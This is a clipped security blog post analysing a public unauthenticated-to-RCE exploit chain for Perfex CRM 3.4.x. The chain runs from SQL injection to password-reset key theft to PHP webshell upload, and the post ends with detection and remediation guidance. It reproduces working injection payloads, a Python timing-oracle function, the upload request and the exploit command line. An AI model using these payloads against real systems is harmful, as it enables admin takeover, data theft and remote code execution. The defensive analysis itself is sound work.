---
title: "Perfex CRM 3.4.x and Earlier: Unauthenticated to RCE in Three Quiet Steps | Garrett Stimpson"
source: https://garrettstimpson.ca/posts/2026/08/18/perfex-crm-unauthenticated-rce-chain/
source_host: garrettstimpson.ca
clip_date: 2026-09-22T10:19:28+08:00
trace_id: 499bcfdf-fd49-4a08-8e2e-13489e17c5a2
content_hash: 25b430abd605664f680d66dff64df5899019926b94e4d09f5e308fd4344146bb
status: synced
tags:
  - 漏洞分析
  - Web安全
series: null
feed_source: Garrett Stimpson
ai_summary: Perfex CRM 3.4.x 及更早版本存在一条公开且无 CVE 的未授权 RCE 链：SQL 注入窃取密码重置码接管管理员，再上传 PHP 内存马执行任意命令。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3e375244-d011-81ff-9f7f-c213fb20f478
ioc:
  cves: []
  cwes:
    - CWE-640
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> Perfex CRM 3.4.x 及更早版本存在一条公开且无 CVE 的未授权 RCE 链：SQL 注入窃取密码重置码接管管理员，再上传 PHP 内存马执行任意命令。
> 
> - **三漏洞链：** 未授权 SQLi（`/migration/make` 的 `old_base_url`）→ 盲注读取管理员邮箱与 `new_pass_key` → 重置密码登录 → 经 `/admin/misc/upload_sales_file` 上传 PHP 马到 `uploads/newsfeed/1/`，以 www-data 执行；单看均属中危，串联为 CVSS 9.8。
> - **盲注手法：** payload 形如 `x", "y") WHERE (SELECT IF((条件),1,0))=1 -- /`，条件为真时全表 `replace` 变慢直至超时（判为 TRUE），为假则秒回；约 3 分钟即可取完 32 位十六进制重置密钥，前提仅是 `migration_enabled=true`。
> - **上传缺陷：** `handle_sales_attachments()` 直接 `move_uploaded_file()`，不校验扩展名与 MIME，目标目录无 `.htaccess`，`.php/.phtml/.phar` 均可被解析；应用内其他上传路径都有过滤。
> - **Webshell：** `cmd7.php` 利用 mm0r1 的 PHP UAF（bug 81705）劫持 Closure handlers 指向 `zif_system`，绕过 `disable_functions`，适用 PHP 7.3–8.1；`cmd83.php`（TimeAfterFree）覆盖 8.2–8.5。
> - **修复与检测：** 关闭 `migration_enabled`、迁移控制器加鉴权并改用参数化查询、给该上传函数补扩展名白名单并在 uploads 目录禁执行脚本；排查上盯 `/migration/make` 异常慢请求、非本人触发的重置邮件、`uploads/newsfeed/` 下的 PHP 文件。

A few days ago I pulled a GitHub repo that had been up for less than a week. Zero stars, zero forks, zero discussion anywhere I could find. No CVE number, no vendor advisory, no tweet, no forum thread. It is a full, weaponized, unauthenticated-to-RCE chain for Perfex CRM 3.4.x and earlier, complete with two working webshells, and as far as I can tell the security community has not noticed it exists.

This post is my attempt to fix that. I read the entire repository: the README, the exploit script line by line, both shells. Here is everything it does, why it works, and how to stop it.

## What Perfex CRM is

Perfex CRM is a PHP/CodeIgniter CRM that runs on plain LAMP stacks, no framework magic required. It handles customers, invoices, contracts, proposals, projects, tickets, and staff accounts, and it is popular exactly because it is self-hosted and cheap. That popularity is what makes this interesting: the installed base is enormous, and most of it is administered by small businesses, not dedicated security teams.

The vulnerable versions are 3.4.x and earlier, tested by the author on 3.3.0 and 3.4.0.

## The chain at a glance

The repo chains three separate weaknesses, each of which exists independently and each of which would be medium-severity on its own. Together they are a CVSS 9.8 critical:

```
ATTACKER (no credentials)
   │
   ▼
1. SQLi in /migration/make          <- unauthenticated, boolean blind (timing)
   │    extracts admin email from tblstaff
   ▼
2. Trigger forgot_password for admin, then
   extract the 32-char new_pass_key through the same oracle
   │
   ▼
3. Build reset URL, change admin password, log in
   │
   ▼
4. Upload a PHP webshell via /admin/misc/upload_sales_file
   │    no extension check, lands in uploads/newsfeed/
   ▼
5. RCE as www-data
```

The three bugs are:

1.  **Unauthenticated SQL injection** in the Migration controller, where the `old_base_url` GET parameter is concatenated straight into UPDATE queries.
2.  **Password reset token theft**, because that injection can read `new_pass_key` out of the staff table after triggering a reset.
3.  **Arbitrary PHP file upload**, because the sales attachment upload helper never validates extensions, unlike every other upload path in the app.

Let me take each one apart.

## Vulnerability 1: the SQL injection nobody authenticates

Perfex has a migration feature used when you move a deployment from one domain to another (or import data from a previous install). It rewrites URLs stored inside the database, replacing the old base URL with the new one. The controller that does this is `application/controllers/Migration.php`:

```php
public function make()
{
    // NO AUTHENTICATION CHECK!

    $old_url = $this->input->get('old_base_url');  // <- attacker controlled
    $new_url = $this->config->item('base_url');

    foreach ($tables as $t) {
        // Direct concatenation into raw SQL query!
        $this->db->query('UPDATE `' . $t['table'] . '` SET `' . $t['field']
            . '` = replace(' . $t['field'] . ', "' . $old_url . '", "' . $new_url . '")');
        //                                          ^^^^^^^^^^^
        //                             NO escaping, NO prepared statement!
    }
}
```

There is a lot going on in those few lines. First, the controller extends `App_Controller`, not `AdminController`, and there is no auth middleware on the route at all. The only guard is a configuration flag:

```php
if ($this->config->item('migration_enabled') !== true) {
    die;
}
```

So the endpoint is reachable by anyone, as long as `migration_enabled` is true. In a fresh default install the flag is false, which is the single biggest reason this is not a fire-everywhere catastrophe. But the README’s point is fair and I think correct: this flag is exactly the kind of thing that gets turned on during a migration or an update and then never turned off. Migration is a one-time operation, yet the toggle sits in config files for the life of the box. I have seen this pattern a hundred times in other apps.

### The injection itself

The `old_base_url` value is quoted directly into the query. The exploit closes the quote and paren, comments out the rest, and lets the UPDATE’s `WHERE` clause become its playground:

```
/migration/make?old_base_url=x", "y") WHERE 1=0 -- /
```

When the injection is well-formed and the WHERE clause is `1=0`, the UPDATE touches zero rows and returns “links replaced” in the response body, which the exploit uses as its confirmation signal. When you inject a condition instead, you get a boolean oracle with a timing side channel:

```sql
# TRUE condition (slow, processes all rows):
/migration/make?old_base_url=x", "y") WHERE (SELECT IF((1=1), 1, 0)) = 1 -- /

# FALSE condition (fast, skips all rows):
/migration/make?old_base_url=x", "y") WHERE (SELECT IF((1=0), 1, 0)) = 1 -- /
```

If the condition is true, the UPDATE actually runs `replace()` across every row in the table, which is slow. If it is false, the query short-circuits and returns quickly. A remote attacker can therefore ask the database arbitrary yes/no questions by measuring response time. That is textbook boolean-based blind SQL injection, and it needs no error output, no stacked queries, and no UNION.

The exploit’s oracle function is blunt but effective:

```python
def bool_sqli(base_url, ctx, condition, timeout=8):
    """TRUE = timeout (slow), FALSE = fast 200"""
    payload = f'x", "y") WHERE (SELECT IF(({condition}), 1, 0)) = 1 -- /'
    url = f"{base_url}/migration/make?old_base_url={urllib.parse.quote(payload)}"
    start = time.time()
    try:
        urllib.request.urlopen(urllib.request.Request(url), timeout=timeout, context=ctx)
        return False
    except Exception:
        if time.time() - start >= timeout * 0.6:
            return True
        return None
```

Note that “TRUE” is represented by a *timeout*: the request hangs because the query is doing real work. FALSE returns quickly. That asymmetry is the whole channel.

### Extracting data one character at a time

With the oracle in hand, data extraction is mechanical. For each position, first probe the length:

```
LENGTH((SELECT email FROM tblstaff WHERE staffid=1)) >= N
```

Then for each candidate character in the charset, ask:

```
SUBSTRING((SELECT email FROM tblstaff WHERE staffid=1), N, 1) = 'c'
```

The exploit’s charset is `abcdefghijklmnopqrstuvwxyz0123456789@._-+`, which covers emails and hex tokens. The staff ID is a parameter (`--staff-id`, default 1), because staff ID 1 is the administrator in a default install.

Extraction is slow by nature: one request per character per candidate, each request spending up to the timeout budget. The README estimates about three minutes to pull the 32 hex characters of a password reset key, which is entirely reasonable and absolutely fast enough for a real attack.

## Vulnerability 2: stealing the password reset token

Knowing the admin’s email address is useful but not enough. The chain’s second trick is turning the injection into a full account takeover without ever knowing the password.

The exploit does this:

1.  Extracts the admin email via the oracle (from `tblstaff` where `staffid=1`).
2.  POSTs to `/admin/authentication/forgot_password` with that email, which is a legitimate unauthenticated endpoint. It grabs the CSRF token from the page first (Perfex, like most CodeIgniter apps, is CSRF-protected even on login forms), then submits the form. This writes a fresh `new_pass_key` into the staff row and queues the reset email to the admin.
3.  Re-runs the same blind oracle to read `new_pass_key` out of `tblstaff`, 32 hex characters, before the admin ever opens the email, and before the key expires.
4.  Constructs the password reset URL:

```
/authentication/reset_password?email=admin@example.com&key=<32 hex chars>
```

1.  Hands the operator a browser-ready link: open it, type a new password, done. The exploit even prompts for this interactively, because changing the password is the one step it leaves to a human.

This is CWE-640 territory: weak password recovery mechanics, where the reset secret is recoverable by an attacker who can read the database. The reset token is supposed to be a secret that only arrives in the admin’s inbox. Here it is extractable at will, and the extraction does not even need to race the email, it just needs to beat the expiry window.

From here the attacker is the administrator. Two-factor? Perfex’s staff login flow at these versions does not stop someone who already holds a valid session-less reset link and a known email. The account is simply gone.

## Vulnerability 3: the upload handler that forgot to check extensions

The last bug is the one that turns an admin account takeover into remote code execution. Perfex has an upload helper used for sales attachments, `application/helpers/upload_helper.php`:

```php
function handle_sales_attachments($rel_id, $rel_type)
{
    $path = get_upload_path_by_type($rel_type) . $rel_id . '/';

    $type = $_FILES['file']['type'];
    _maybe_create_upload_path($path);
    $filename = unique_filename($path, $_FILES['file']['name']);
    $newFilePath = $path . $filename;

    // VULNERABILITY: Direct move_uploaded_file() - NO extension check!
    if (move_uploaded_file($tmpFilePath, $newFilePath)) {
        // File saved as-is - .php, .phtml, .phar all accepted!
    }
}
```

The README is emphatic about this and it is worth emphasizing again: this handler does `move_uploaded_file()` straight to disk. No `_upload_extension_allowed()` check. No MIME validation. No image re-encode. No `.htaccess` in the destination to deny script execution. Every other upload path in Perfex filters extensions; this one does not.

The destination is also web-accessible: `uploads/newsfeed/`, organized as `uploads/newsfeed/<rel_id>/<filename>`. Because there is no `.htaccess` in that directory tree, an uploaded `yuca_abc123.php` is executed by the web server the moment it is requested. That is the difference between “an attacker uploaded a file” and “an attacker has a shell”.

### The upload request itself

By the time the exploit reaches this phase it is logged in as admin, so it has to behave like the admin. It first fetches any authenticated page (`/admin/tasks`, `/admin`, or `/admin/tickets`) and scrapes the 32-hex CSRF token out of the HTML:

```python
m = re.search(r'csrf_token_name[^a-f0-9]*([a-f0-9]{32})', html)
```

Then it builds a multipart POST to `/admin/misc/upload_sales_file`:

```haskell
POST /admin/misc/upload_sales_file
Content-Type: multipart/form-data; boundary=----Exploit<random>
X-Requested-With: XMLHttpRequest

--boundary
Content-Disposition: form-data; name="csrf_token_name"
<csrf>

--boundary
Content-Disposition: form-data; name="rel_id"
1

--boundary
Content-Disposition: form-data; name="type"
newsfeed

--boundary
Content-Disposition: form-data; name="file"; filename="yuca_xxx.php"
Content-Type: application/octet-stream

<PHP shell source>

--boundary--
```

The `type=newsfeed` field is what routes the file into `uploads/newsfeed/`, and `rel_id=1` controls the subdirectory. The response is JSON:

```json
{ "success": true, "rel_id": "1", "file_name": "yuca_xxx.php" }
```

which gives the attacker the exact URL of their new shell:

```
https://target.com/uploads/newsfeed/1/yuca_xxx.php
```

Finally the exploit verifies the shell is alive by hitting it with `?cmd=echo YUCA_OK` (and tries `?c=` as an alternative parameter name, in case a different shell template is used) and checks the response contains the marker:

```python
for param in ["cmd", "c"]:
    test_url = f"{shell_url}?{param}=echo+YUCA_OK"
    ...
    if "YUCA_OK" in body:
        return param
```

If the primary shell does not respond, the exploit falls back to the backup shell and tests again, which handles the case where the target runs a different PHP major version than the first shell was built for.

## The shells themselves

The uploaded PHP files are not trivial one-liners. They are full memory-safety exploits, and understanding them is the difference between “webshell” and “weaponized”.

### cmd7.php: mm0r1’s UAF, PHP 7.3 to 8.1

`cmd7.php` is the well-known heap exploitation technique by mm0r1 (the code is credited in the file’s header comment, and it references PHP bug report 81705). It is a user-after-free in PHP’s string handling that runs on \*nix builds of PHP 7.3 through 8.1.

The way it works, at a high level:

1.  **Heap grooming.** It allocates a bunch of strings to lay out the heap in a predictable pattern, including a string adjacent to a zend_string buffer.
2.  **Heap leak.** A deliberately broken concatenation (`$arr[1] .= <string>` where `$arr` is an array with two elements) triggers a conversion that turns the array into the literal string `"Array"`. The trick: an error handler replaces `$arr` with `1` mid-conversion, so the copy ends up reading beyond its own buffer, leaking the addresses of neighboring heap objects. That gives the exploit a pointer to its own allocations.
3.  **The UAF.** It frees one of its strings while a reference to it still exists (a use-after-free), then allocates a `Helper` object into the same slot. The string’s stale zval now aliases live object memory.
4.  **Handlers hijack.** By reading and writing through the stale string reference, the exploit locates a `Closure` object’s `handlers` table, copies it, and rewrites the closure’s function handler to point at `zif_system`, the internal C function behind PHP’s `system()`.
5.  **Invoke.** Calling the closure with the attacker’s command now dispatches straight into `zif_system`, executing `system($cmd)` in the PHP process’s own memory space, completely bypassing `disable_functions`.

This is important context for defenders: `disable_functions` and `open_basedir` do not stop this shell. The bypass is at the VM level, not the config level. `system`, `exec`, `shell_exec`, `passthru`, all the usual suspects can be blacklisted in `php.ini` and this shell will still call the underlying C function directly.

### cmd83.php: TimeAfterFree, PHP 8.2 to 8.5

`cmd83.php` is the same family of technique updated for modern PHP. PHP 8.x’s internal changes broke the old grooming, so the repo ships a TimeAfterFree variant that targets the newer allocator behavior on PHP 8.2 through 8.5. I did not dissect it line by line the way I did `cmd7.php`, but the README positions it as the compatibility shim: upload `cmd7.php` first, and if it does not answer, the exploit automatically uploads `cmd83.php` and tests again. The two together give the attacker coverage from PHP 7.3 to 8.5, which is the overwhelming majority of PHP in production today.

## The full kill chain, step by step

Putting it all together, a single command:

```bash
python3 exploit.py https://target.com --filebackdoor cmd7.php --backup cmd83.php
```

walks the entire chain unattended except for one manual password change in the browser:

1.  Probe `GET /migration/make?old_base_url=x", "y") WHERE 1=0 -- /` and confirm “links replaced” in the response. Injection confirmed, no authentication required.
2.  Blind-extract the admin email from `tblstaff` (staffid 1 by default), one character at a time via timing.
3.  GET `/admin/authentication/forgot_password`, scrape the CSRF token, POST the admin email to trigger a password reset. A fresh `new_pass_key` is now in the database.
4.  Blind-extract the 32-character hex `new_pass_key`, about three minutes of requests.
5.  Print the reset URL: `/authentication/reset_password?email=<admin>&key=<hex>`. The operator opens it in a browser and sets a new password.
6.  POST the new credentials to the admin login and confirm success (the response no longer redirects to the authentication page).
7.  GET an authenticated page, scrape the CSRF token, POST the multipart upload to `/admin/misc/upload_sales_file` with `type=newsfeed`, `rel_id=1`, and the PHP shell as `file`.
8.  Read the JSON response for the shell URL, verify with `?cmd=echo YUCA_OK`, and report:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)

Backdoor location:
https://target.com/uploads/newsfeed/1/yuca_x8k2.php

curl 'https://target.com/.../yuca_x8k2.php?cmd=id'
```

From that point the attacker has arbitrary command execution as `www-data`: read `.env` and `application/config/database.php` for credentials, dump the entire CRM database (customers, invoices, contracts, payment details), write a cron persistence backdoor, or pivot into the internal network. A 9.8 is a 9.8.

## Why nobody is talking about this

The honest answer is that this vulnerability has no CVE identifier, no vendor advisory, no disclosure timeline, and no attention. The repo is four days old, has no stars, and does not appear in any search results I could find. The security ecosystem is CVE-driven: scanners, advisories, blogs, and patching queues all key off the CVE database. A chain like this falls between the cracks precisely because it is not in that database.

That is not a defense of the situation, it is a warning about it. The absence of a CVE number does not change the fact that the exploit is public, complete, and works against an extremely popular piece of self-hosted software. If you run Perfex CRM, treat this as a critical advisory regardless of what the CVE databases say.

## Detection

The attack has fingerprints. If you run Perfex, look for:

1.  **Suspicious requests to `/migration/make`.** The legit use case is a one-time operation during a domain migration. Any recurring, slow, or malformed-looking hits on that endpoint from the internet are an attack. The blind injection is chatty by design: dozens to hundreds of requests, each hanging for several seconds when the condition is true.
2.  **Password reset emails nobody requested.** The chain triggers `forgot_password` for the admin account as a deliberate step. An admin receiving a reset email they did not ask for, especially with no subsequent login from their usual IP, is the chain mid-flight.
3.  **New PHP files in `uploads/newsfeed/`.** Audit that directory tree for `*.php`, `*.phtml`, `*.phar` files. There is no legitimate reason for PHP to appear in an uploads directory that is supposed to hold images and attachments.
4.  **Logins to the admin account from unexpected IPs** shortly after a reset event.
5.  **Outbound requests from the origin** to `/admin/tasks` and `/admin/misc/upload_sales_file` in a pattern that looks like CSRF scraping followed by an upload.

## Remediation

The fixes are straightforward and each one independently breaks the chain:

1.  **Turn migration off.** Set `migration_enabled` to false and remove the flag entirely once the domain move is done. Migration is a one-time operation; the toggle should not survive it.
2.  **Authenticate and parameterize the controller.** The Migration controller should extend `AdminController`, require `is_admin()`, and use prepared statements or query bindings for `old_base_url` instead of string concatenation. An unauthenticated endpoint that writes raw SQL is indefensible as designed.
3.  **Add extension validation to `handle_sales_attachments()`.** It must call the same `_upload_extension_allowed()` check every other upload handler uses, whitelist only document/image extensions, and ideally re-verify with `finfo` rather than trusting the client’s `Content-Type`.
4.  **Deny script execution in uploads.** Drop an `.htaccess` (or nginx equivalent) into `uploads/` that refuses to execute PHP, so even a successful upload is inert. This is defense in depth and should have been there all along.
5.  **Monitor.** Watch `/migration/make` in access logs and `uploads/newsfeed` for PHP files, and alert on password-reset events for staff accounts.

## The lesson

This chain is a masterclass in why “small” bugs matter. Three individual weaknesses, each of which a security reviewer might wave off as low severity: an unauthenticated endpoint guarded by a config flag, a reset token readable by SQLi, an upload path missing one validation call. None of them is glamorous. Chained, they are a 9.8 with a public exploit and no CVE to warn anyone.

The boring bugs are the ones that kill you. Patch your Perfex, turn off the migration controller, and go check your uploads directory right now.
